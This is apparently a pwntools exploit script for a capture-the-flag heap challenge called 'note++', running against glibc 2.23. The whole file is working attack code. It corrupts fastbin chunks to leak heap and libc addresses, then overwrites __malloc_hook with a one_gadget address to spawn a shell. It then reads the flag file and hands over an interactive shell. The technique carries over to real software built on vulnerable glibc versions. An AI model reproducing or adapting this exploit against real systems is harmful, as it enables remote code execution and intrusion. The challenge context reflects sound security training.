#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( 'libc-2.23.so' )

y = remote( 'localhost' , 10181 )
#y = remote( 'edu-ctf.csie.org' , 10181 )
#y = process( '../note++/share/note++' )
#pause()


def add( size , note , desc ):
    y.sendafter( '>' , '1' )
    y.sendafter( 'Size: ' , str( size ) )
    y.sendafter( 'Note: ' , note )
    y.sendlineafter( ': ' , desc )

def lis():
    y.sendafter( '>' , '2' )
    #y.sendafter( 'Index: ' , str( index ) )

def dle( index ):
    y.sendafter( '>' , '3' )
    y.sendafter( 'Index: ' , str( index ) )



add( 0x68 , 'a' , 'A' )
add( 0x68 , 'b' , 'B' )
add( 0x68 , 'c' , 'C' )
add( 0x68 , flat( '\0' * 0x58 , 0x71 ) , 'D' )
add( 0x78 , 'a' * 0x78 , 'U' * 0x30 )
add( 0x78 , 'b' * 0x78 , 'd' )
add( 0x10 , 'p' , 'p' )

dle( 3 )
dle( 1 )
dle( 2 )
dle( 0 )

add( 0x68 , 'a' , 'a' * 0x38 )

lis()
y.recvuntil( 'Note 1:' )
y.recvuntil( 'Data: ' )
heap = u64( y.recv(6) + '\0\0' ) - 0x150
success( 'heap -> %s' % hex( heap ) )

dle( 1 )

add( 0x68 , p64( heap + 0x1b0 ) , 'a' )
add( 0x68 , 'a' , 'a' )
add( 0x68 , 'a' , 'a' )

add( 0x68 , flat( 0 , p64( 0x101 ) ) , 'a' )

dle( 4 )

dle( 3 )
add( 0x68 , 'a' , 'a' * 0x38 )

lis()
y.recvuntil( 'Note 4:' )
y.recvuntil( 'Data: ' )
l.address = u64( y.recv(6) + '\0\0' ) - 0x3c4b78
success( 'libc -> %s' % hex( l.address ) )

dle(1)
dle(2)
dle(0)
add( 0x68 , 'a' , 'a' * 0x38 )

dle(1)

add( 0x68 , p64( l.sym.__malloc_hook - 0x10 - 3 ) , 'a' )
add( 0x68 , 'a' , 'a' )
add( 0x68 , 'a' , 'a' )

one = 0xf02a4

add( 0x68 , 'a' * 3 + p64( l.address + one ) , 'a' )

dle(4)

sleep( 0.3 )
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()